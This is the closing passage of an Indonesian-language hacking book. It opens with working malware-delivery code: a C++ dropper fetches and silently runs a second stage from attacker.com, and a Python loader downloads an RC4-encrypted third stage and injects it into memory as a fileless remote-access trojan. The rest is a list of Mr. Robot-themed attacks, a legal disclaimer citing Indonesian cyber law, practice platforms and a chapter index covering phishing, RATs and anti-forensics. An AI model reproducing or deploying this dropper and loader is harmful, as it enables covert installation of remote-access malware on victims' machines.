Stage 3: RAT utama (jalan di memory, fileless)
```

---
#### **📌 Contoh Multi-Stage Payload**
**Stage 1 (Dropper - C++):**
```cpp
#include <windows.h>
#include <wininet.h>
#include <string>
#pragma comment(lib, "wininet.lib")

int main() {
    // Download Stage 2
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnectA(hInternet, "attacker.com", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "/stage2.bin", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);

    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        char buffer[4096];
        DWORD bytesRead;
        HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\stage2.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            WriteFile(hFile, buffer, bytesRead, &bytesRead, NULL);
        }
        CloseHandle(hFile);

        // Execute Stage 2
        WinExec("C:\\Windows\\Temp\\stage2.bin", SW_HIDE);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 0;
}
```

**Stage 2 (Loader - Python):**
```python
import ctypes
import sys
import requests
import base64

# Decrypt Stage 3 (RC4)
def rc4_decrypt(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

# Download & decrypt Stage 3
response = requests.get("http://attacker.com/stage3.enc")
key = "RAHASIA"
stage3 = rc4_decrypt(key, response.content)

# Inject ke memory & execute
kernel32 = ctypes.windll.kernel32
mem = kernel32.VirtualAlloc(None, len(stage3), 0x3000, 0x40)
ctypes.memmove(mem, stage3, len(stage3))
thread = kernel32.CreateThread(None, 0, mem, None, 0, None)
kernel32.WaitForSingleObject(thread, -1)
```

---
---
---

## **🔹 BAB 14: MR. ROBOT TEKNIK (SEASON 1-4)**

---
### **📌 Semua Teknik dari Serial Mr. Robot**
Lihat **Mr_Robot_Hacking_Lengkap.md** untuk **semua teknik** dari **Season 1-4**, termasuk:
- **ARP Spoofing (S1E1)**
- **DDoS Attack (S1E2)**
- **Social Engineering (S1E3)**
- **FTP Exploit (S1E4)**
- **SMS Spoofing (S1E5)**
- **Android Hacking (S1E5)**
- **USB Drop Attack (S1E6)**
- **Bluetooth Hacking (S1E7)**
- **RFID Cloning (S1E8)**
- **Raspberry Pi Implant (S1E9)**
- **Five/Nine Hack (S1E10)**
- **Femtocell Hack (S2E5)**
- **Car Hacking (S2E9)**
- **DNS Spoofing (S2E11)**
- **Supply Chain Attack (S3E5)**
- **Steganography (S3E4)**
- **Kernel Exploit (S3E5)**
- **BitTorrent Tracking (S3E9)**
- **Smart TV Hacking (S3E10)**
- **Email Server Hacking (S4E1)**
- **Web App Hacking (S4E2)**
- **Credit Card Skimming (S4E3)**
- **Proxy Chaining (S4E4)**
- **Zero-Day Exploit (S4E5)**
- **Password Manager Hacking (S4E6)**
- **Air-Gapped Hacking (S4E7)**
- **BGP Hijacking (S4E9)**
- **Mass Data Destruction (S4E11)**

---
---
---

## **🔹 BAB 15: DISCLAIMER & ETIKA**

---
### **⚠️ PERINGATAN ETIKA & LEGAL**
**Semua teknik dalam buku ini adalah untuk tujuan:**
✅ **Penelitian & Pendidikan**
✅ **Defensive Security Testing** (dengan izin tertulis)
✅ **Bug Bounty Programs**
✅ **CTF (Capture The Flag) & Lab Pribadi**

---

### **❌ DILARANG (Ilegal di Indonesia & Kebanyakan Negara)**
- **Unauthorized Access** (Akses sistem tanpa izin) → **UU ITE Pasal 30** (Maksimal **6 tahun penjara**).
- **Modifying/Deleting Data** (Mengubah/menghapus data) → **UU ITE Pasal 32** (Maksimal **7 tahun penjara**).
- **DDoS Attack** → **UU ITE Pasal 33** (Maksimal **10 tahun penjara**).
- **Phishing** → **Penipuan (Pasal 378 KUHP)**.
- **Spyware/RAT** → **Pelanggaran Privasi (UU ITE Pasal 31)**.
- **Malware Distribution** → **UU ITE Pasal 33**.

---
### **📜 UU ITE (Undang-Undang Informasi dan Transaksi Elektronik)**
| Pasal | Keterangan | Hukuman |
|-------|------------|---------|
| **Pasal 30** | Akses ilegal ke sistem komputer | **Maksimal 6 tahun penjara + denda Rp1 Milyar** |
| **Pasal 31** | Intercept (menguping) informasi | **Maksimal 4 tahun penjara + denda Rp750 Juta** |
| **Pasal 32** | Perusakan data/menghapus data | **Maksimal 7 tahun penjara + denda Rp1 Milyar** |
| **Pasal 33** | Gangguan sistem (DoS/DDoS) | **Maksimal 10 tahun penjara + denda Rp2 Milyar** |
| **Pasal 35** | Penyebaran malware | **Maksimal 8 tahun penjara + denda Rp1,5 Milyar** |
| **Pasal 36** | Pemanfaatan data pribadi tanpa izin | **Maksimal 5 tahun penjara + denda Rp500 Juta** |

---
### **🔒 Penulis & Distributor TIDAK Bertanggung Jawab**
- **Penyalahgunaan informasi ini adalah tanggung jawab pembaca sepenuhnya.**
- **Penggunaan tanpa izin adalah ILEGAL dan berakibat hukum.**
- **Gunakan pengetahuan ini untuk melindungi sistem Anda, bukan untuk merugikan orang lain.**

---
### **🛡️ Bagaimana Menggunakan Pengetahuan Ini Secara Legal?**
1. **Penetration Testing** – Testing dengan **kontrak resmi**.
2. **Bug Bounty** – Lapor vulnerability ke vendor (HackerOne, Bugcrowd).
3. **Red Team Exercise** – Simulasi serangan untuk organisasi sendiri.
4. **Security Research** – Penelitian di **environment terisolasi**.
5. **CTF & Lab Pribadi** – Latihan di **VM vulnerable** (Metasploitable, DVWA).

---
### **🌍 Platform Legal untuk Latihan**
| Platform | Deskripsi | Link |
|----------|-----------|------|
| **HackTheBox** | Lab realistis | [hackthebox.com](https://www.hackthebox.com) |
| **TryHackMe** | Guided learning | [tryhackme.com](https://tryhackme.com) |
| **VulnHub** | Vulnerable VMs | [vulnhub.com](https://www.vulnhub.com) |
| **OverTheWire** | Wargames | [overthewire.org](https://overthewire.org) |
| **PortSwigger Web Security Academy** | Web hacking gratis | [portswigger.net](https://portswigger.net/web-security) |

---
### **🎓 Sertifikasi Keamanan Siber**
| Sertifikasi | Level | Deskripsi |
|-------------|-------|------------|
| **eJPT** | Junior | Practical Junior Pentester |
| **PNPT** | Intermediate | Practical Network Pentester |
| **OSCP** | Advanced | Offensive Security Certified Professional |
| **CEH** | Professional | Certified Ethical Hacker |
| **CISSP** | Expert | Certified Information Systems Security Professional |

---
---
---
## **📎 LINK CEPAT KE BAB-BAB PENTING**
| Bab | Deskripsi | Link |
|-----|------------|------|
| **Bab 1** | Setup Termux & Kali Linux | Lihat Bab 1 |
| **Bab 2** | OSINT & Phishing | Lihat Bab 2 |
| **Bab 3** | WiFi Hacking | Lihat Bab 3 |
| **Bab 4** | Android Hacking | Lihat Bab 4 |
| **Bab 5** | Website Hacking | Lihat Bab 5 |
| **Bab 6** | Windows Hacking | Lihat Bab 6 |
| **Bab 7** | CCTV Hacking | Lihat Bab 7 |
| **Bab 8** | RAT & Spyware | Lihat Bab 8 |
| **Bab 9** | Gmail Hacking | Lihat Bab 9 |
| **Bab 10** | Pertahanan | Lihat Bab 10 |
| **Bab 11** | Bypass Pertahanan | Lihat Bab 11 |
| **Bab 12** | Anti-Forensics | Lihat Bab 12 |
| **Bab 13** | Teknik Lanjutan 2026 | Lihat Bab 13 |
| **Bab 14** | Mr. Robot Teknik | Lihat Bab 14 |

---
---
---
## **🎯 KESIMPULAN**
Buku ini berisi **semua teknik hacking** dari **dasar hingga lanjutan**, termasuk:
✅ **Setup lingkungan** (Termux, Kali Linux)
✅ **OSINT & Reconnaissance**
✅ **WiFi Hacking** (WPA2, WPA3, Evil Twin)
✅ **Android Hacking** (RAT, Spyware, Reset Jarak Jauh)
✅ **Website & Database Hacking** (SQLi, XSS, DDoS)
✅ **Windows Hacking** (Metasploit, Token Theft)
✅ **CCTV Hacking**
✅ **Phishing & Social Engineering**
✅ **Pertahanan Berlapis**
✅ **Bypass Pertahanan**
✅ **Anti-Forensics**
✅ **Teknik Lanjutan 2026** (Cloud C2, AI-Assisted, Multi-Stage Payload)
✅ **Semua Teknik dari Mr. Robot (Season 1-4)**

**Gunakan pengetahuan ini dengan bijak. Hacking adalah senjata — dan senjata bisa digunakan untuk melindungi atau merusak.**
